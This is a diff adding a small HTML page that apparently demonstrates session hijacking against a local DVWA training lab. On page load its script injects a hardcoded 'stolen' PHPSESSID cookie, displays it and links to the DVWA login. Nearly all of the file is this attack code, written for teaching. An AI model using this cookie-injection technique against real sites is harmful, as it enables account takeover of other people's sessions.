@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Session Hijack Demo</title>
+</head>
+<body>
+    <h1>Session Hijack Demonstration</h1>
+    
+    <div id="output"></div>
+    
+    <script>
+    // Function to hijack session
+    function hijackSession() {
+        const cookieValue = 'p219sid4q0qntbre7e5qafto2o9';
+        
+        // Set the stolen cookie
+        document.cookie = `PHPSESSID=${cookieValue}; path=/;`;
+        
+        // Show proof
+        const output = document.getElementById('output');
+        output.innerHTML = `
+            <h2>✅ Cookie Injected!</h2>
+            <p><strong>Cookie Set:</strong> PHPSESSID=${cookieValue}</p>
+            <p><strong>All Cookies:</strong> ${document.cookie}</p>
+            <p>Click below to test login:</p>
+            <button onclick="testLogin()">Test DVWA Login</button>
+        `;
+        
+        console.log('SESSION HIJACK DEMO:');
+        console.log('1. Cookie injected:', document.cookie);
+        console.log('2. Now attacker can access DVWA');
+    }
+    
+    function testLogin() {
+        // Open DVWA in same tab
+        window.location.href = 'http://localhost/dvwa/';
+    }
+    
+    // Auto-run on page load
+    hijackSession();
+    </script>
+</body>
+</html>
